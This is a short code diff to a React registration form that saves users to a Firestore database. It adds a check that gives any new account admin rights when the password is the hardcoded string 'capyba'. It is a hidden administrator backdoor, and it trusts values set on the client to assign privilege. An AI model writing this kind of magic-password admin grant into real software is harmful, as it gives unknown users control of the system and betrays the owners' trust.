@@ -80,7 +80,11 @@ export default function Register() {
     e.preventDefault();
 
     if (formData.name !== '' && formData.email !== '' && formData.password !== '') {
-     
+      if (formData.password === 'capyba') {
+        formData.imageURL = 'https://mikeallegra.files.wordpress.com/2022/09/capy-sayin-hi.jpg';
+        formData.admin = true;
+        formData.level = 1;
+      }
       try {
         
         const response = await addDoc(collection(db, "users" ), formData);
